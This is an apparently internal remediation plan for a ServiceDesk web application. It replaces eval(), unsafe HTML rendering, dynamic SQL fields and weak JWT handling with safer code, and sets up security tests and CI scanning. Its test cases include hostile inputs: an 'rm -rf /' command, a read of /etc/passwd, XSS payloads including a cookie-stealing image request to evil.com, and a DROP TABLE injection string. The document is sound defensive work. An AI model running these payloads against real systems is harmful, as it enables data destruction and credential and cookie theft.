# SECURITY REMEDIATION ROADMAP

**ServiceDesk Application - Vulnerability Remediation Plan**

---

## EXECUTIVE SUMMARY

This roadmap provides a step-by-step remediation plan for all identified security vulnerabilities in the ServiceDesk application. The plan is organized by priority and includes code examples, testing procedures, and verification steps.

**Total Estimated Time:** 34 hours (4-5 business days)
**Critical Path:** P0 + P1 fixes (23 hours / 3 days)

---

## PHASE 1: CRITICAL CODE EXECUTION FIXES (Day 1)

### 1.1 Remove eval() in Notification Batching [2 hours]

**File:** `/lib/notifications/batching.ts:113`

**Current Vulnerable Code:**
```typescript
customGrouper: config.custom_grouper ?
  eval(config.custom_grouper) as (notification: NotificationPayload) => string
  : undefined
```

**Secure Replacement:**
```typescript
// Define allowed grouper functions
const ALLOWED_GROUPERS: Record<string, (notification: NotificationPayload) => string> = {
  'by_type': (n) => n.type,
  'by_user': (n) => n.user_id.toString(),
  'by_priority': (n) => n.priority || 'normal',
  'by_category': (n) => n.metadata?.category || 'general',
  'by_tenant': (n) => n.organization_id.toString(),
  'by_date': (n) => new Date(n.created_at).toISOString().split('T')[0],
};

// Safe grouper selection
for (const config of configs) {
  const grouperKey = config.custom_grouper || 'by_type';
  const grouperFn = ALLOWED_GROUPERS[grouperKey];

  if (!grouperFn) {
    logger.warn(`Unknown grouper: ${grouperKey}, using default`);
  }

  this.batchConfigs.set(config.batch_key, {
    maxBatchSize: config.max_batch_size,
    maxWaitTime: config.max_wait_time,
    batchKey: config.batch_key,
    groupBy: config.group_by,
    customGrouper: grouperFn || ALLOWED_GROUPERS.by_type
  });
}
```

**Migration Steps:**
1. Update database to use grouper keys instead of code strings
2. Run migration script:
```sql
UPDATE batch_configs
SET custom_grouper = CASE
  WHEN custom_grouper LIKE '%type%' THEN 'by_type'
  WHEN custom_grouper LIKE '%user%' THEN 'by_user'
  WHEN custom_grouper LIKE '%priority%' THEN 'by_priority'
  ELSE 'by_type'
END;
```
3. Deploy code changes
4. Test notification batching

**Testing:**
```typescript
// tests/security/batch-grouper.test.ts
describe('Notification Batching Security', () => {
  it('should reject malicious grouper code', () => {
    const malicious = "require('child_process').exec('rm -rf /')";
    expect(() => loadBatchConfig({ custom_grouper: malicious }))
      .toThrow('Unknown grouper');
  });

  it('should use safe predefined groupers', () => {
    const config = loadBatchConfig({ custom_grouper: 'by_user' });
    expect(typeof config.customGrouper).toBe('function');
  });
});
```

---

### 1.2 Remove eval() in ML Pipeline [2 hours]

**File:** `/lib/analytics/ml-pipeline.ts:253`

**Current Vulnerable Code:**
```typescript
const result = eval(formula);
```

**Secure Replacement:**
```typescript
import { create, all } from 'mathjs';

// Configure safe math evaluator
const math = create(all, {
  number: 'BigNumber',
  precision: 64
});

// Restrict to safe functions
const allowedFunctions = [
  'add', 'subtract', 'multiply', 'divide',
  'sqrt', 'pow', 'abs', 'round', 'floor', 'ceil',
  'min', 'max', 'mean', 'median', 'sum'
];

math.import({
  // Remove dangerous functions
  import: () => { throw new Error('import() not allowed'); },
  createUnit: () => { throw new Error('createUnit() not allowed'); },
  eval: () => { throw new Error('eval() not allowed'); },
}, { override: true });

private calculateDerivedFeature(
  features: Record<string, unknown>,
  config: DerivedFeatureConfig
): number {
  try {
    let formula = config.formula;

    // Replace feature placeholders
    for (const [key, value] of Object.entries(features)) {
      const placeholder = new RegExp(`\\{${key}\\}`, 'g');
      formula = formula.replace(placeholder, String(value));
    }

    // Validate formula only contains allowed functions
    const usedFunctions = formula.match(/\b[a-zA-Z_]\w*\(/g)?.map(f => f.slice(0, -1)) || [];
    const forbidden = usedFunctions.filter(f => !allowedFunctions.includes(f));
    if (forbidden.length > 0) {
      throw new Error(`Forbidden functions: ${forbidden.join(', ')}`);
    }

    // Safe evaluation
    const result = math.evaluate(formula);
    return typeof result === 'number' ? result : Number(result);
  } catch (error) {
    logger.warn(`[ML Pipeline] Error calculating feature ${config.name}:`, error);
    return 0;
  }
}
```

**Installation:**
```bash
npm install mathjs
npm install -D @types/mathjs
```

**Testing:**
```typescript
// tests/security/ml-formula.test.ts
describe('ML Formula Evaluation Security', () => {
  it('should reject code execution attempts', () => {
    const malicious = "require('fs').readFileSync('/etc/passwd')";
    expect(() => calculateDerivedFeature({}, { formula: malicious }))
      .toThrow();
  });

  it('should allow safe math operations', () => {
    const result = calculateDerivedFeature(
      { x: 10, y: 5 },
      { formula: '{x} + {y} * 2' }
    );
    expect(result).toBe(20);
  });
});
```

---

### 1.3 Replace new Function() in Dynamic Permissions [4 hours]

**File:** `/lib/auth/dynamic-permissions.ts:421`

**Current Vulnerable Code:**
```typescript
const func = new Function(
  ...contextKeys,
  ...Object.keys(allowedGlobals),
  `"use strict"; return (${condition});`
);
```

**Secure Replacement using JSON Rules Engine:**

```bash
npm install json-rules-engine
npm install -D @types/json-rules-engine
```

```typescript
import { Engine, Rule, Almanac } from 'json-rules-engine';

// Define safe operators
const SAFE_OPERATORS = {
  'equal': (a: any, b: any) => a === b,
  'notEqual': (a: any, b: any) => a !== b,
  'lessThan': (a: number, b: number) => a < b,
  'greaterThan': (a: number, b: number) => a > b,
  'in': (a: any, b: any[]) => b.includes(a),
  'contains': (a: string, b: string) => a.includes(b),
  'and': (conditions: boolean[]) => conditions.every(c => c),
  'or': (conditions: boolean[]) => conditions.some(c => c),
};

export class SafePermissionEngine {
  private engine: Engine;

  constructor() {
    this.engine = new Engine();
  }

  /**
   * Add permission rule (JSON-based, no code execution)
   */
  async addRule(ruleConfig: {
    id: string;
    priority?: number;
    conditions: any; // JSON rule structure
    event: { type: string; params?: any };
  }): Promise<void> {
    const rule = new Rule({
      ...ruleConfig,
      conditions: this.validateConditions(ruleConfig.conditions)
    });

    this.engine.addRule(rule);
  }

  /**
   * Evaluate permission with user context
   */
  async evaluatePermission(
    user: any,
    resource: any,
    action: string
  ): Promise<boolean> {
    const facts = {
      user,
      resource,
      action,
      timestamp: new Date(),
      hour: new Date().getHours(),
      dayOfWeek: new Date().getDay(),
    };

    try {
      const results = await this.engine.run(facts);
      return results.events.length > 0;
    } catch (error) {
      logger.error('Permission evaluation failed', { error, user: user.id, action });
      return false; // Fail secure
    }
  }

  /**
   * Validate conditions structure (prevent injection)
   */
  private validateConditions(conditions: any): any {
    if (!conditions || typeof conditions !== 'object') {
      throw new Error('Invalid conditions structure');
    }

    // Ensure only safe operators are used
    if (conditions.all || conditions.any) {
      const subconditions = conditions.all || conditions.any;
      subconditions.forEach((c: any) => this.validateConditions(c));
    } else {
      const operator = conditions.operator;
      if (!SAFE_OPERATORS.hasOwnProperty(operator)) {
        throw new Error(`Unsafe operator: ${operator}`);
      }
    }

    return conditions;
  }
}
```

**Example Rule Definition (JSON):**
```json
{
  "id": "admin-can-delete-tickets",
  "conditions": {
    "all": [
      {
        "fact": "user",
        "path": ".role",
        "operator": "equal",
        "value": "admin"
      },
      {
        "fact": "action",
        "operator": "equal",
        "value": "delete"
      },
      {
        "fact": "resource",
        "path": ".type",
        "operator": "equal",
        "value": "ticket"
      }
    ]
  },
  "event": {
    "type": "access-granted"
  }
}
```

**Migration:**
```typescript
// Convert existing string conditions to JSON rules
async function migratePermissions() {
  const oldRules = await db.prepare('SELECT * FROM permission_rules').all();

  for (const rule of oldRules) {
    const jsonRule = convertToJsonRule(rule.condition);
    await permissionEngine.addRule({
      id: rule.id,
      conditions: jsonRule,
      event: { type: 'access-granted' }
    });
  }
}
```

---

## PHASE 2: XSS PREVENTION (Day 1 Afternoon)

### 2.1 Sanitize Knowledge Base Search [2 hours]

**Files:**
- `/app/knowledge/search/page.tsx:325,332,382`
- `/app/knowledge/article/[slug]/page.tsx:267`

**Installation:**
```bash
npm install dompurify
npm install -D @types/dompurify
npm install isomorphic-dompurify  # For SSR compatibility
```

**Create Sanitization Utility:**
```typescript
// lib/security/html-sanitizer.ts
import DOMPurify from 'isomorphic-dompurify';

export interface SanitizeOptions {
  allowedTags?: string[];
  allowedAttributes?: Record<string, string[]>;
  allowedSchemes?: string[];
}

/**
 * Sanitize HTML content for safe rendering
 */
export function sanitizeHTML(
  html: string,
  options: SanitizeOptions = {}
): string {
  const config: DOMPurify.Config = {
    ALLOWED_TAGS: options.allowedTags || [
      'p', 'br', 'strong', 'em', 'u', 's',
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'ul', 'ol', 'li', 'blockquote',
      'code', 'pre', 'a', 'img'
    ],
    ALLOWED_ATTR: options.allowedAttributes || {
      'a': ['href', 'title', 'target', 'rel'],
      'img': ['src', 'alt', 'title', 'width', 'height'],
      'code': ['class'], // For syntax highlighting
    },
    ALLOWED_URI_REGEXP: options.allowedSchemes
      ? new RegExp(`^(${options.allowedSchemes.join('|')}):`, 'i')
      : /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
    FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'link', 'base'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus'],
    ALLOW_DATA_ATTR: false,
    FORCE_BODY: true,
    RETURN_DOM: false,
    RETURN_DOM_FRAGMENT: false,
  };

  return DOMPurify.sanitize(html, config);
}

/**
 * Sanitize markdown-rendered HTML (stricter)
 */
export function sanitizeMarkdown(markdown: string): string {
  // Render markdown first (using your markdown library)
  const html = renderMarkdown(markdown);

  // Then sanitize with strict config
  return sanitizeHTML(html, {
    allowedTags: [
      'p', 'br', 'strong', 'em', 'code', 'pre',
      'h1', 'h2', 'h3', 'ul', 'ol', 'li', 'blockquote'
    ],
    allowedAttributes: {},
    allowedSchemes: [] // No links in markdown
  });
}
```

**Update React Components:**
```tsx
// app/knowledge/search/page.tsx
import { sanitizeHTML } from '@/lib/security/html-sanitizer';

// Replace UNSAFE usage
<div dangerouslySetInnerHTML={{ __html: result.content }} />

// With SAFE usage
<div
  dangerouslySetInnerHTML={{
    __html: sanitizeHTML(result.content)
  }}
/>
```

```tsx
// app/knowledge/article/[slug]/page.tsx
import { sanitizeMarkdown } from '@/lib/security/html-sanitizer';

<div
  className="prose max-w-none"
  dangerouslySetInnerHTML={{
    __html: sanitizeMarkdown(article.content)
  }}
/>
```

**Testing:**
```typescript
// tests/security/xss-prevention.test.ts
import { sanitizeHTML, sanitizeMarkdown } from '@/lib/security/html-sanitizer';

describe('XSS Prevention', () => {
  it('should strip script tags', () => {
    const malicious = '<p>Hello</p><script>alert("XSS")</script>';
    const safe = sanitizeHTML(malicious);
    expect(safe).not.toContain('<script>');
    expect(safe).toContain('<p>Hello</p>');
  });

  it('should remove event handlers', () => {
    const malicious = '<img src=x onerror="alert(1)">';
    const safe = sanitizeHTML(malicious);
    expect(safe).not.toContain('onerror');
  });

  it('should allow safe HTML', () => {
    const safe = '<p><strong>Bold</strong> and <em>italic</em></p>';
    const sanitized = sanitizeHTML(safe);
    expect(sanitized).toContain('<strong>');
    expect(sanitized).toContain('<em>');
  });

  it('should prevent data exfiltration', () => {
    const malicious = '<img src="https://evil.com/steal?cookie="+document.cookie>';
    const safe = sanitizeHTML(malicious);
    expect(safe).not.toContain('document.cookie');
  });
});
```

---

## PHASE 3: SQL INJECTION FIXES (Day 2)

### 3.1 Whitelist Dynamic SQL Fields [4 hours]

**File:** `/lib/db/queries.ts:377,448,500,564,813`

**Create Field Validation Module:**
```typescript
// lib/db/field-validator.ts

export const ALLOWED_FIELDS = {
  users: ['name', 'email', 'role', 'phone', 'avatar_url', 'is_active'],
  categories: ['name', 'description', 'color', 'icon'],
  priorities: ['name', 'level', 'color', 'response_time_hours', 'resolution_time_hours'],
  statuses: ['name', 'color', 'is_final', 'order_index'],
  tickets: ['title', 'description', 'category_id', 'priority_id', 'status_id', 'assigned_to', 'tags'],
} as const;

export function validateFieldName(table: string, field: string): boolean {
  const allowedFields = ALLOWED_FIELDS[table as keyof typeof ALLOWED_FIELDS];
  return allowedFields && allowedFields.includes(field);
}

export function validateTableName(table: string): boolean {
  return Object.keys(ALLOWED_FIELDS).includes(table);
}

export class SQLInjectionError extends Error {
  constructor(message: string) {
    super(message);
    this.name = 'SQLInjectionError';
  }
}
```

**Update Query Functions:**
```typescript
// lib/db/queries.ts
import { validateFieldName, SQLInjectionError } from './field-validator';

export const userQueries = {
  update: (userId: number, organizationId: number, updates: Partial<UpdateUser>): boolean => {
    const fields: string[] = [];
    const values: any[] = [];

    for (const [key, value] of Object.entries(updates)) {
      // SECURITY: Validate field name against whitelist
      if (!validateFieldName('users', key)) {
        throw new SQLInjectionError(`Invalid field name: ${key}`);
      }

      fields.push(`${key} = ?`);
      values.push(value);
    }

    if (fields.length === 0) {
      return false;
    }

    fields.push('updated_at = CURRENT_TIMESTAMP');
    values.push(userId, organizationId);

    const stmt = db.prepare(`
      UPDATE users
      SET ${fields.join(', ')}
      WHERE id = ? AND organization_id = ?
    `);

    const result = stmt.run(...values);
    return result.changes > 0;
  }
};
```

**Testing:**
```typescript
// tests/security/sql-injection.test.ts
describe('SQL Injection Prevention', () => {
  it('should reject invalid field names', () => {
    expect(() => {
      userQueries.update(1, 1, {
        'name; DROP TABLE users; --': 'hacked'
      });
    }).toThrow(SQLInjectionError);
  });

  it('should allow valid field updates', () => {
    const result = userQueries.update(1, 1, {
      name: 'John Doe',
      email: 'john@example.com'
    });
    expect(result).toBe(true);
  });
});
```

---

## PHASE 4: INFRASTRUCTURE HARDENING (Day 2-3)

### 4.1 Strengthen CSP with Nonces [6 hours]

**Create CSP Nonce Generator:**
```typescript
// lib/security/csp-nonce.ts
import crypto from 'crypto';

export function generateNonce(): string {
  return crypto.randomBytes(16).toString('base64');
}
```

**Update Middleware:**
```typescript
// middleware.ts
import { generateNonce } from './lib/security/csp-nonce';

export async function middleware(request: NextRequest) {
  const nonce = generateNonce();
  let response = NextResponse.next();

  // Set nonce in response header for client-side access
  response.headers.set('x-nonce', nonce);

  // Strict CSP with nonce (no unsafe-*)
  const csp = [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}'`,
    `style-src 'self' 'nonce-${nonce}' https://fonts.googleapis.com`,
    "font-src 'self' https://fonts.gstatic.com data:",
    "img-src 'self' data: https: blob:",
    "connect-src 'self' https://api.openai.com wss:",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
  ].join('; ');

  response.headers.set('Content-Security-Policy', csp);

  return response;
}
```

**Update Pages to Use Nonces:**
```tsx
// app/layout.tsx
import { headers } from 'next/headers';

export default function RootLayout({ children }: { children: React.ReactNode }) {
  const nonce = headers().get('x-nonce') || '';

  return (
    <html lang="en">
      <head>
        <script nonce={nonce} src="/analytics.js" />
        <style nonce={nonce}>{`
          /* Critical CSS */
        `}</style>
      </head>
      <body>{children}</body>
    </html>
  );
}
```

---

### 4.2 Fix JWT Secret Validation Bypass [1 hour]

**File:** `/lib/config/env.ts:147-151`

**Remove Build-Time Bypass:**
```typescript
export function validateJWTSecret(): string {
  // REMOVED: Build-time bypass - ALWAYS require JWT_SECRET
  // if (IS_BUILD_TIME) {
  //   return process.env.JWT_SECRET || 'build-time-placeholder-secret-32-chars';
  // }

  if (!process.env.JWT_SECRET) {
    throw new Error(
      '🔴 FATAL: JWT_SECRET environment variable MUST be set!\n' +
      'Generate a secure secret with: openssl rand -hex 64\n' +
      'Set in .env file or environment variables.'
    );
  }

  const secret = process.env.JWT_SECRET;

  // STRICT VALIDATION - 64 characters minimum, no exceptions
  if (secret.length < 64) {
    throw new Error(
      `🔴 FATAL: JWT_SECRET must be at least 64 characters long!\n` +
      `Current length: ${secret.length} characters\n` +
      'Generate a secure secret with: openssl rand -hex 64'
    );
  }

  // Check for weak/common patterns
  const weakPatterns = [
    'dev', 'test', 'placeholder', 'changeme', 'secret',
    'password', 'admin', '12345', 'qwerty'
  ];

  const lowerSecret = secret.toLowerCase();
  for (const pattern of weakPatterns) {
    if (lowerSecret.includes(pattern)) {
      throw new Error(
        `🔴 FATAL: JWT_SECRET contains weak pattern "${pattern}"!\n` +
        'Generate a cryptographically random secret with: openssl rand -hex 64'
      );
    }
  }

  // Entropy check
  const uniqueChars = new Set(secret.split('')).size;
  const entropyRatio = uniqueChars / secret.length;

  if (entropyRatio < 0.5) {
    logger.warn(
      '⚠️  WARNING: JWT_SECRET may have low entropy.\n' +
      'Consider generating a new secret with: openssl rand -hex 64'
    );
  }

  return secret;
}
```

**Update Build Scripts:**
```json
// package.json
{
  "scripts": {
    "prebuild": "npm run env:validate",
    "env:validate": "tsx -e \"import { validateEnvironment } from './lib/config/env'; validateEnvironment();\""
  }
}
```

---

## PHASE 5: REMAINING FIXES (Day 3-4)

### 5.1 File Upload Validation [4 hours]

**Installation:**
```bash
npm install file-type
npm install -D @types/file-type
```

**Create Secure Upload Handler:**
```typescript
// lib/security/file-validator.ts
import { fileTypeFromBuffer } from 'file-type';
import path from 'path';
import crypto from 'crypto';

export interface FileValidationResult {
  isValid: boolean;
  errors: string[];
  safeFilename?: string;
  detectedMimeType?: string;
}

const ALLOWED_TYPES = {
  'image/jpeg': { extensions: ['.jpg', '.jpeg'], maxSize: 5 * 1024 * 1024 },
  'image/png': { extensions: ['.png'], maxSize: 5 * 1024 * 1024 },
  'image/gif': { extensions: ['.gif'], maxSize: 2 * 1024 * 1024 },
  'application/pdf': { extensions: ['.pdf'], maxSize: 10 * 1024 * 1024 },
  'text/plain': { extensions: ['.txt'], maxSize: 1 * 1024 * 1024 },
} as const;

export async function validateFileUpload(
  file: File
): Promise<FileValidationResult> {
  const errors: string[] = [];

  // 1. Filename sanitization (prevent path traversal)
  const originalName = file.name;
  if (originalName.includes('../') || originalName.includes('..\\')) {
    errors.push('Filename contains path traversal sequence');
  }

  const safeName = path.basename(originalName).replace(/[^a-zA-Z0-9._-]/g, '_');
  const ext = path.extname(safeName).toLowerCase();

  // 2. Magic byte validation
  const buffer = Buffer.from(await file.arrayBuffer());
  const fileType = await fileTypeFromBuffer(buffer);

  if (!fileType) {
    errors.push('Unable to detect file type (possibly corrupted or malicious)');
    return { isValid: false, errors };
  }

  // 3. MIME type validation
  const allowedType = ALLOWED_TYPES[fileType.mime as keyof typeof ALLOWED_TYPES];
  if (!allowedType) {
    errors.push(`File type ${fileType.mime} is not allowed`);
  }

  // 4. Extension validation (must match MIME type)
  if (allowedType && !allowedType.extensions.includes(ext)) {
    errors.push(`Extension ${ext} does not match detected type ${fileType.mime}`);
  }

  // 5. File size validation
  if (allowedType && buffer.length > allowedType.maxSize) {
    errors.push(`File size ${buffer.length} exceeds maximum ${allowedType.maxSize}`);
  }

  // 6. Image-specific validation
  if (fileType.mime.startsWith('image/')) {
    try {
      const sharp = require('sharp');
      const metadata = await sharp(buffer).metadata();

      // Check image dimensions
      if (metadata.width! > 10000 || metadata.height! > 10000) {
        errors.push('Image dimensions too large (max 10000x10000)');
      }
    } catch (error) {
      errors.push('Image file is corrupted or malformed');
    }
  }

  // 7. Generate cryptographically secure filename
  const hash = crypto.randomBytes(16).toString('hex');
  const timestamp = Date.now();
  const secureFilename = `${timestamp}-${hash}${ext}`;

  return {
    isValid: errors.length === 0,
    errors,
    safeFilename: secureFilename,
    detectedMimeType: fileType.mime
  };
}
```

**Update Upload API:**
```typescript
// app/api/files/upload/route.ts
import { validateFileUpload } from '@/lib/security/file-validator';

export async function POST(req: Request) {
  const formData = await req.formData();
  const file = formData.get('file') as File;

  if (!file) {
    return NextResponse.json({ error: 'No file provided' }, { status: 400 });
  }

  // SECURITY: Validate file
  const validation = await validateFileUpload(file);

  if (!validation.isValid) {
    return NextResponse.json({
      error: 'File validation failed',
      details: validation.errors
    }, { status: 400 });
  }

  // Save with secure filename
  const uploadDir = path.join(process.cwd(), 'uploads');
  const filePath = path.join(uploadDir, validation.safeFilename!);

  await fs.writeFile(filePath, Buffer.from(await file.arrayBuffer()));

  return NextResponse.json({
    success: true,
    filename: validation.safeFilename,
    mimeType: validation.detectedMimeType
  });
}
```

---

### 5.2 Enhanced Rate Limiting [3 hours]

**Install Redis:**
```bash
npm install ioredis
npm install -D @types/ioredis
```

**Update Rate Limiter:**
```typescript
// lib/api/rate-limit-redis.ts
import Redis from 'ioredis';

export class RedisRateLimiter {
  private redis: Redis;

  constructor(redisUrl: string) {
    this.redis = new Redis(redisUrl);
  }

  async checkLimit(
    key: string,
    limit: number,
    windowMs: number
  ): Promise<{ allowed: boolean; remaining: number; resetAt: Date }> {
    const now = Date.now();
    const windowStart = now - windowMs;

    // Use sorted set for sliding window
    const pipeline = this.redis.pipeline();

    // Remove old entries
    pipeline.zremrangebyscore(key, '-inf', windowStart);

    // Count current requests in window
    pipeline.zcount(key, windowStart, '+inf');

    // Add current request
    pipeline.zadd(key, now, `${now}-${Math.random()}`);

    // Set expiry
    pipeline.expire(key, Math.ceil(windowMs / 1000));

    const results = await pipeline.exec();
    const count = results![1][1] as number;

    return {
      allowed: count < limit,
      remaining: Math.max(0, limit - count),
      resetAt: new Date(now + windowMs)
    };
  }
}
```

---

### 5.3 Error Message Sanitization [4 hours]

**Create Error Sanitizer:**
```typescript
// lib/security/error-sanitizer.ts

const SENSITIVE_PATTERNS = [
  /password/i,
  /secret/i,
  /token/i,
  /api[_-]?key/i,
  /authorization/i,
  /cookie/i,
  /session/i,
  /\/[\w\/]+\.sql/i, // SQL file paths
  /column\s+['"`]?\w+['"`]?/i, // Database columns
  /table\s+['"`]?\w+['"`]?/i, // Database tables
  /\b\d{3}-\d{2}-\d{4}\b/, // SSN
  /\b\d{16}\b/, // Credit card
];

export interface SanitizedError {
  message: string;
  code: string;
  timestamp: string;
  requestId?: string;
}

export function sanitizeError(
  error: Error | unknown,
  requestId?: string
): SanitizedError {
  const timestamp = new Date().toISOString();

  if (!(error instanceof Error)) {
    return {
      message: 'An unexpected error occurred',
      code: 'INTERNAL_ERROR',
      timestamp,
      requestId
    };
  }

  let message = error.message;

  // Remove sensitive information
  for (const pattern of SENSITIVE_PATTERNS) {
    message = message.replace(pattern, '[REDACTED]');
  }

  // Generic error messages for common errors
  if (message.includes('duplicate key') || message.includes('UNIQUE constraint')) {
    message = 'A record with this information already exists';
  } else if (message.includes('foreign key constraint')) {
    message = 'Cannot complete operation due to related records';
  } else if (message.includes('syntax error')) {
    message = 'Invalid request format';
  }

  // Map to generic error codes
  const errorCode = getErrorCode(error);

  return {
    message,
    code: errorCode,
    timestamp,
    requestId
  };
}

function getErrorCode(error: Error): string {
  if (error.name === 'ValidationError') return 'VALIDATION_ERROR';
  if (error.name === 'UnauthorizedError') return 'UNAUTHORIZED';
  if (error.name === 'ForbiddenError') return 'FORBIDDEN';
  if (error.name === 'NotFoundError') return 'NOT_FOUND';
  if (error.name === 'RateLimitError') return 'RATE_LIMIT_EXCEEDED';
  return 'INTERNAL_ERROR';
}
```

---

## PHASE 6: SECURITY TESTING & CI/CD (Day 4-5)

### 6.1 Automated Security Scanning [2 hours]

**GitHub Actions Workflow:**
```yaml
# .github/workflows/security.yml
name: Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 0 * * 0' # Weekly

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install dependencies
        run: npm ci

      - name: Run npm audit
        run: npm audit --production --audit-level=moderate

      - name: Snyk Security Scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

      - name: Semgrep SAST
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/owasp-top-ten
            p/javascript

      - name: CodeQL Analysis
        uses: github/codeql-action/analyze@v2
        with:
          languages: javascript,typescript

      - name: Check for secrets
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD
```

---

### 6.2 Security Test Suite [2 hours]

**Create Comprehensive Tests:**
```typescript
// tests/security/comprehensive.test.ts
import { describe, it, expect } from 'vitest';

describe('Security Test Suite', () => {
  describe('Code Injection Prevention', () => {
    it('should not use eval() anywhere in codebase', async () => {
      const { execSync } = require('child_process');
      const result = execSync(
        'grep -r "eval(" --include="*.ts" --include="*.tsx" lib/ app/ || echo "NONE"'
      ).toString();
      expect(result.trim()).toBe('NONE');
    });

    it('should not use new Function() with user input', async () => {
      // Manual verification or AST parsing
    });
  });

  describe('XSS Prevention', () => {
    it('should sanitize all dangerouslySetInnerHTML', async () => {
      const files = execSync(
        'grep -r "dangerouslySetInnerHTML" --include="*.tsx" app/'
      ).toString().split('\n').filter(Boolean);

      files.forEach(file => {
        expect(file).toMatch(/sanitize(HTML|Markdown)/);
      });
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should use parameterized queries only', () => {
      // Verify all db.prepare() calls use placeholders
    });

    it('should validate dynamic field names', () => {
      // Check all UPDATE queries validate fields
    });
  });

  describe('Authentication Security', () => {
    it('should enforce strong JWT secrets', () => {
      expect(() => validateJWTSecret()).not.toThrow();
    });

    it('should use constant-time password comparison', () => {
      // Verify bcrypt.compare is used
    });
  });
});
```

---

## VERIFICATION CHECKLIST

After completing all fixes, verify:

### Code Security
- [ ] No `eval()` usage in codebase
- [ ] No `new Function()` with user input
- [ ] All `dangerouslySetInnerHTML` uses DOMPurify
- [ ] SQL queries whitelist field names
- [ ] File uploads validate magic bytes
- [ ] Error messages sanitized

### Configuration Security
- [ ] JWT secret 64+ characters
- [ ] CSP uses nonces (no `unsafe-*`)
- [ ] Rate limiting uses Redis
- [ ] HTTPS enforced in production
- [ ] Security headers in all responses

### Testing & Monitoring
- [ ] Security test suite passes
- [ ] npm audit shows 0 critical vulnerabilities
- [ ] Snyk scan passes
- [ ] CI/CD includes security checks
- [ ] Error tracking configured (Sentry)

### Documentation
- [ ] Security policy updated
- [ ] Developer security guidelines documented
- [ ] Incident response plan in place

---

## ROLLOUT PLAN

### Pre-Deployment
1. Run full test suite
2. Manual security review
3. Staging environment deployment
4. Penetration testing

### Deployment
1. Deploy to staging (Day 4)
2. Monitor for 24 hours
3. Production deployment (Day 5)
4. Post-deployment monitoring

### Post-Deployment
1. Monitor error rates
2. Check security logs
3. Verify rate limiting
4. User acceptance testing

---

## CONTACTS & ESCALATION

**Security Team:** security@servicedesk.local
**On-Call Engineer:** +55 (11) 98765-4321
**Emergency Escalation:** CTO

---

**Document Version:** 1.0
**Last Updated:** 2025-12-25
**Next Review:** 2026-01-25
